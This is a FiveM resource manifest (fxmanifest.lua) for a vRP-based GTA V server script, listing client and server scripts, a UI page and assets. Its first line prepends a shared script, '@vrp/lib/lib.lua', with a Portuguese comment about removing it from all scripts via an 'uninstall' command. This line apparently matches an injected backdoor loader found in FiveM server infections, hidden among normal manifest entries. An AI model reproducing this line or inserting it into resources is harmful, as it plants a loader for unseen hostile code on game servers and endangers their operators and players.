shared_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"



fx_version 'bodacious'
game 'gta5'

ui_page 'index.html'

client_scripts {
	'@vrp/lib/utils.lua',
	'client.lua'
}

server_scripts {
	'@vrp/lib/utils.lua',
	'server.lua'
}

files {
    'index.html',
    'assets/audios/audio.mp3',
    'assets/images/icon-check.png',
    'assets/images/icon-close.png',
    'assets/images/icon-admin.png',
    'assets/icon-check.png',
    'assets/icon-close.png',
    'assets/icon-admin.png',
    'assets/images/*.png',
    'assets/*.png',
    'assets/script.js',
    'assets/style.css'
}                                          